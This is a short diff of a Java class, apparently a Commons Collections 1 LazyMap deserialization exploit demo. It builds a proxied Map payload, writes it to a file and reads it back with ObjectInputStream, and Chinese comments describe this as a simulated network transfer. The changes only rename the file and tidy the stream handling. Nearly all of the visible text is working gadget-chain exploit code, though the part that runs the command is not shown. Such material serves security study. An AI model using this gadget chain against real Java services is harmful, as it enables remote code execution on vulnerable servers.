@@ -40,14 +40,11 @@ public class CommonsCollections1L {
         Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith);
         Object o = ctor.newInstance(SuppressWarnings.class, mapProxy);
 
-        //payload序列化写入文件，模拟网络传输
-        FileOutputStream fos = new FileOutputStream("cc1l.out");
-        ObjectOutputStream oos = new ObjectOutputStream(fos);
-        oos.writeObject(o);
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc1p.out"));
+        outputStream.writeObject(o);
+        outputStream.close();
 
-        //服务端读取文件，反序列化，模拟网络传输
-        FileInputStream fis = new FileInputStream("cc1l.out");
-        ObjectInputStream ois = new ObjectInputStream(fis);
-        ois.readObject();
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc1p.out"));
+        inputStream.readObject();
     }
 }
